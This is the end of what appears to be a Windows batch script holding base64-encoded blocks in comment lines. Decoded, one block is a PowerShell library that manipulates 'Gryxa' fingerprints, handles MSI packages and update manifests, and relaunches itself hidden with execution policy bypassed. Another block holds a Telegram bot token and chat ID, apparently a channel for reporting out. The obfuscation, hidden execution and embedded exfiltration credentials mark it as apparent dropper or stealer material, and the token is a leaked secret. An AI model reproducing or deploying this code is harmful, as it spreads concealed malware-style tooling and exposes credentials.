::ZnAnICAgew0KICAgICAgICAkZyA9IEZpbmQtUnVubmluZ0dyeXhhRnANCiAgICAg
::ICAgaWYgKCRnKSB7DQogICAgICAgICAgICBTZXQtR3J5eGFGcCAkZw0KICAgICAg
::ICAgICAgV3JpdGUtT3V0cHV0ICJTWU5DRUR8JGciDQogICAgICAgIH0gZWxzZSB7
::DQogICAgICAgICAgICAkY3VyID0gR2V0LUdyeXhhRnANCiAgICAgICAgICAgIGlm
::ICgtbm90IChUZXN0LUlzR3J5eGFGcCAkY3VyKSAtYW5kICRzY3JpcHQ6R3J5eGFF
::eHBlY3RlZEZwKSB7DQogICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJHNjcmlw
::dDpHcnl4YUV4cGVjdGVkRnANCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQg
::IlJFU0VUfCQoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIg0KICAgICAgICAgICAg
::fSBlbHNlIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIk5PTkV8JGN1
::ciINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAndGVzdC1t
::c2knICAgICAgICB7DQogICAgICAgICRwYXRoID0gJEV4dHJhDQogICAgICAgIGlm
::ICgtbm90ICRwYXRoKSB7IFdyaXRlLU91dHB1dCAnbm8nOyBicmVhayB9DQogICAg
::ICAgIGlmIChUZXN0LU1zaVBhY2thZ2UgJHBhdGggJEZwKSB7IFdyaXRlLU91dHB1
::dCAneWVzJyB9IGVsc2UgeyBXcml0ZS1PdXRwdXQgJ25vJyB9DQogICAgfQ0KICAg
::ICdwcm90ZWN0LW1zaScgICAgIHsNCiAgICAgICAgJHNhZmUgPSBQcm90ZWN0LU1z
::aVNpYmxpbmdTYWZlICRFeHRyYQ0KICAgICAgICBpZiAoJHNhZmUpIHsgV3JpdGUt
::T3V0cHV0ICRzYWZlIH0gZWxzZSB7IFdyaXRlLU91dHB1dCAnRkFJTCcgfQ0KICAg
::IH0NCiAgICAndmVyaWZ5LXVwZGF0ZScgICB7DQogICAgICAgICMgRXh0cmEgPSAi
::bWFuaWZlc3R8c2lnfG5hbWU9cGF0aDtuYW1lMj1wYXRoMiINCiAgICAgICAgJHBh
::cnRzID0gJEV4dHJhIC1zcGxpdCAnXHwnLCAzDQogICAgICAgIGlmICgkcGFydHMu
::Q291bnQgLWx0IDMpIHsgV3JpdGUtT3V0cHV0ICdiYWQtYXJncyc7IGJyZWFrIH0N
::CiAgICAgICAgJG1hcCA9IEB7fQ0KICAgICAgICBmb3JlYWNoICgkcGFpciBpbiAo
::JHBhcnRzWzJdIC1zcGxpdCAnOycpKSB7DQogICAgICAgICAgICBpZiAoJHBhaXIg
::LW1hdGNoICdeKFtePV0rKT0oLiopJCcpIHsgJG1hcFskbWF0Y2hlc1sxXV0gPSAk
::bWF0Y2hlc1syXSB9DQogICAgICAgIH0NCiAgICAgICAgV3JpdGUtT3V0cHV0IChU
::ZXN0LVVwZGF0ZU1hbmlmZXN0ICRwYXJ0c1swXSAkcGFydHNbMV0gJG1hcCkNCiAg
::ICB9DQogICAgJ3N5bmMtc2V2cnotZnAnICAgew0KICAgICAgICBpZiAoJEV4dHJh
::KSB7IFdyaXRlLU91dHB1dCAoU3luYy1TZXZyekV4cGVjdGVkICRFeHRyYSkgfQ0K
::ICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICRrID0gQChHZXQtU2V2cnpLZWVw
::KQ0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICgiU0VWUlp8JCgka1swXSl8JCgk
::a1sxXSkiKQ0KICAgICAgICB9DQogICAgfQ0KICAgICdncnl4YS1lbnN1cmUnICAg
::IHsNCiAgICAgICAgaWYgKCROb1dhaXQpIHsNCiAgICAgICAgICAgICMgTDM1L0wz
::OTogcGFzcyBBcmd1bWVudExpc3QgYXMgc3RyaW5nIGFycmF5IChqb2luZWQgc3Ry
::aW5nIGlzIGEgU3RhcnQtUHJvY2VzcyBmb290Z3VuKQ0KICAgICAgICAgICAgJHBz
::ID0gKEdldC1Qcm9jZXNzIC1JZCAkUElEKS5QYXRoDQogICAgICAgICAgICBpZiAo
::LW5vdCAkcHMpIHsgJHBzID0gJ3Bvd2Vyc2hlbGwuZXhlJyB9DQogICAgICAgICAg
::ICAkYXJnTGlzdCA9IEAoDQogICAgICAgICAgICAgICAgJy1Ob1Byb2ZpbGUnLCAn
::LUV4ZWN1dGlvblBvbGljeScsICdCeXBhc3MnLA0KICAgICAgICAgICAgICAgICct
::RmlsZScsICRQU0NvbW1hbmRQYXRoLA0KICAgICAgICAgICAgICAgICctQWN0aW9u
::JywgJ2dyeXhhLWVuc3VyZScsDQogICAgICAgICAgICAgICAgJy1Xb3JrRGlyJywg
::JFdvcmtEaXIsDQogICAgICAgICAgICAgICAgJy1CdWlsZCcsICRCdWlsZA0KICAg
::ICAgICAgICAgKQ0KICAgICAgICAgICAgaWYgKCREZWVwKSAgeyAkYXJnTGlzdCAr
::PSAnLURlZXAnIH0NCiAgICAgICAgICAgIGlmICgkRm9yY2UpIHsgJGFyZ0xpc3Qg
::Kz0gJy1Gb3JjZScgfQ0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBh
::dGggJHBzIC1Bcmd1bWVudExpc3QgJGFyZ0xpc3QgLVdpbmRvd1N0eWxlIEhpZGRl
::bg0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICdRVUVVRUR8ZGV0YWNoZWQ9MScN
::CiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAoSW52
::b2tlLUdyeXhhRW5zdXJlIHwgT3V0LVN0cmluZykuVHJpbSgpDQogICAgICAgIH0N
::CiAgICB9DQp9DQo=
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
